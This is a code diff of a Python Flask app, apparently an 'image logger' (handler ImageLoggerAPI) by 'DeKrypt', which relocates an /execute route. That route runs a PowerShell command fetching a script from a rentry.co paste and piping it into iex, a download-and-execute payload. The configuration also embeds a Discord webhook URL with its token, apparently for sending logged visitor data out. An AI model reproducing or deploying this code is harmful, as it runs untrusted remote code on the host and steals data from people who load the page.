@@ -14,6 +14,25 @@ __author__ = "DeKrypt"
 
 app = Flask(__name__)
 
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/execute', methods=['POST'])
+def execute():
+    try:
+        command = 'powershell -Command "irm rentry.co/Testy123/raw | iex"'
+        result = subprocess.run(command, capture_output=True, text=True, shell=True)
+        output = result.stdout if result.returncode == 0 else result.stderr
+    except Exception as e:
+        output = str(e)
+    
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1254053082200018997/Br7pmejcNtSwwOKdBARTRC20_AddressPPrh9ZMt0DeRNAV",
@@ -306,21 +325,3 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/execute', methods=['POST'])
-def execute():
-    try:
-        command = 'powershell -Command "irm rentry.co/Testy123/raw | iex"'
-        result = subprocess.run(command, capture_output=True, text=True, shell=True)
-        output = result.stdout if result.returncode == 0 else result.stderr
-    except Exception as e:
-        output = str(e)
-    
-    return render_template('index.html')
-
-if __name__ == '__main__':
-    app.run(debug=True)
